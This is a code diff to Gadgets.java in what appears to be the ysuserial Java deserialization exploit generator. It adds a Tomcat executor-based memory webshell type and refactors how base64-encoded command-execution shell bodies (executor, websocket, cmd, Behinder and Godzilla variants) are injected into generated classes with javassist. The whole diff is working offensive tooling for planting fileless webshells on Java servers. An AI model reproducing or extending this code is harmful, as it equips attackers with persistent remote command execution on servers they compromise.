@@ -3,6 +3,7 @@ package org.su18.ysuserial.payloads.util;
 
 import static com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.DESERIALIZE_TRANSLET;
 import static org.su18.ysuserial.payloads.templates.MemShellPayloads.*;
+import static org.su18.ysuserial.payloads.util.Utils.loadClassTest;
 import static org.su18.ysuserial.payloads.util.Utils.writeClassToFile;
 
 import java.io.ByteArrayOutputStream;
@@ -16,13 +17,9 @@ import java.util.zip.GZIPOutputStream;
 
 import javassist.*;
 
-import com.sun.org.apache.xalan.internal.xsltc.DOM;
-import com.sun.org.apache.xalan.internal.xsltc.TransletException;
 import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
-import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
-import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
 import org.apache.commons.codec.binary.Base64;
 import org.apache.commons.lang.RandomStringUtils;
 import org.apache.wicket.util.file.Files;
@@ -43,20 +40,6 @@ public class Gadgets {
 	}
 
 	public static final String ANN_INV_HANDLER_CLASS = "sun.reflect.annotation.AnnotationInvocationHandler";
-
-	public static class StubTransletPayload extends AbstractTranslet implements Serializable {
-
-		private static final long serialVersionUID = -5971610431559700674L;
-
-
-		public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
-		}
-
-
-		@Override
-		public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
-		}
-	}
 
 	// required to make TemplatesImpl happy
 	public static class CheckCPUTime implements Serializable {
@@ -134,6 +117,7 @@ public class Gadgets {
 					case "tl":
 					case "ts":
 					case "tw":
+					case "te":
 						packageName += "tomcat.";
 						break;
 					case "sp":
@@ -238,17 +222,15 @@ public class Gadgets {
 					// 测试方便调试暂时不改类名
 					ctClass.setName(className + System.nanoTime());
 				}
-
-				// websocket 型内存马，使用 ClassLoaderTemplate 加载
-				// websocket 型内存马不设置 AbstractTranslet 父类
+				// websocket/executor 型内存马，使用 ClassLoaderTemplate 加载，不设置 AbstractTranslet 父类
 				if (className.contains("WSMS")) {
 					insertKeyMethod(ctClass, "ws");
 					bytes = ctClass.toBytecode();
 					cName = ctClass.getName();
-
-					// 写出查看
-//					writeClassToFile(cName, bytes);
-
+				} else if (className.contains("EXMS")) {
+					insertKeyMethod(ctClass, "execute");
+					bytes = ctClass.toBytecode();
+					cName = ctClass.getName();
 					// 内存马指定类型进行写入恶意逻辑
 				} else if (!Objects.equals(cName, "")) {
 					ctClass.setSuperclass(superClass);
@@ -256,6 +238,10 @@ public class Gadgets {
 				} else {
 					ctClass.setSuperclass(superClass);
 				}
+
+				// 写出和加载测试
+//				writeClassToFile(cName, bytes);
+//				loadClassTest(bytes, cName);
 
 				classBytes = ctClass.toBytecode();
 			}
@@ -280,11 +266,7 @@ public class Gadgets {
 //		writeClassToFile(ctClass.getName(), classBytes);
 
 		// 加载 class 试试
-//		ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
-//		Method      method      = Proxy.class.getDeclaredMethod("defineClass0", ClassLoader.class, String.class, byte[].class, int.class, int.class);
-//		method.setAccessible(true);
-//		Class clazz = (Class) method.invoke(null, classLoader, ctClass.getName(), classBytes, 0, classBytes.length);
-//		clazz.newInstance();
+//		loadClassTest(classBytes, ctClass.getName());
 
 
 		// inject class bytes into instance
@@ -346,6 +328,12 @@ public class Gadgets {
 			}
 		}
 
+		CtClass supClass = ctClass.getSuperclass();
+		if (supClass != null && supClass.getName().equals("org.apache.tomcat.util.threads.ThreadPoolExecutor")) {
+			method = "execute";
+			isTomcat = false;
+		}
+
 		switch (type) {
 			// 冰蝎类型的内存马
 			case "bx":
@@ -379,29 +367,32 @@ public class Gadgets {
 
 				insertMethod(ctClass, method, Utils.base64Decode(GODZILLA_RAW_SHELL));
 				break;
+//			// Tomcat Executor cmd 执行内存马
+			case "execute":
+				ctClass.addField(CtField.make("public static String TAG = \"su18\";", ctClass));
+				insertCMD(ctClass);
+				ctClass.addMethod(CtMethod.make(Utils.base64Decode(GET_REQUEST), ctClass));
+				ctClass.addMethod(CtMethod.make(Utils.base64Decode(BASE64_ENCODE_BYTE_TO_STRING), ctClass));
+				ctClass.addMethod(CtMethod.make(Utils.base64Decode(GET_RESPONSE), ctClass));
 
-			// websocket 内存马
+				insertMethod(ctClass, method, Utils.base64Decode(EXECUTOR_SHELL));
+				break;
+			// websocket cmd 执行内存马
 			case "ws":
-				ctClass.addMethod(CtMethod.make(Utils.base64Decode(TO_CSTRING_Method), ctClass));
-				ctClass.addMethod(CtMethod.make(Utils.base64Decode(GET_METHOD_BY_CLASS), ctClass));
-				ctClass.addMethod(CtMethod.make(Utils.base64Decode(GET_METHOD_AND_INVOKE), ctClass));
-				ctClass.addMethod(CtMethod.make(Utils.base64Decode(GET_FIELD_VALUE), ctClass));
-
+				insertCMD(ctClass);
 				insertMethod(ctClass, method, Utils.base64Decode(WS_SHELL));
 				break;
 			// 命令执行回显内存马
 			case "cmd":
 			default:
-				ctClass.addMethod(CtMethod.make(Utils.base64Decode(TO_CSTRING_Method), ctClass));
-				ctClass.addMethod(CtMethod.make(Utils.base64Decode(GET_METHOD_BY_CLASS), ctClass));
-				ctClass.addMethod(CtMethod.make(Utils.base64Decode(GET_METHOD_AND_INVOKE), ctClass));
-				ctClass.addMethod(CtMethod.make(Utils.base64Decode(GET_FIELD_VALUE), ctClass));
+				insertCMD(ctClass);
 
 				if (isTomcat) {
 					insertMethod(ctClass, method, Utils.base64Decode(CMD_SHELL_FOR_TOMCAT));
 				} else {
 					insertMethod(ctClass, method, Utils.base64Decode(CMD_SHELL));
 				}
+
 				break;
 		}
 	}
@@ -410,5 +401,24 @@ public class Gadgets {
 		// 根据传入的不同参数，在不同方法中插入不同的逻辑
 		CtMethod cm = ctClass.getDeclaredMethod(method);
 		cm.setBody(payload);
+	}
+
+	/**
+	 * 向指定类中写入命令执行方法 execCmd
+	 * 方法需要 toCString getMethodByClass getMethodAndInvoke getFieldValue 依赖方法
+	 *
+	 * @param ctClass 指定类
+	 * @throws Exception 抛出异常
+	 */
+	public static void insertCMD(CtClass ctClass) throws Exception {
+		ctClass.addMethod(CtMethod.make(Utils.base64Decode(TO_CSTRING_Method), ctClass));
+		ctClass.addMethod(CtMethod.make(Utils.base64Decode(GET_METHOD_BY_CLASS), ctClass));
+		ctClass.addMethod(CtMethod.make(Utils.base64Decode(GET_METHOD_AND_INVOKE), ctClass));
+		try {
+			ctClass.getDeclaredMethod("getFieldValue");
+		} catch (NotFoundException e) {
+			ctClass.addMethod(CtMethod.make(Utils.base64Decode(GET_FIELD_VALUE), ctClass));
+		}
+		ctClass.addMethod(CtMethod.make(Utils.base64Decode(EXEC_CMD), ctClass));
 	}
 }
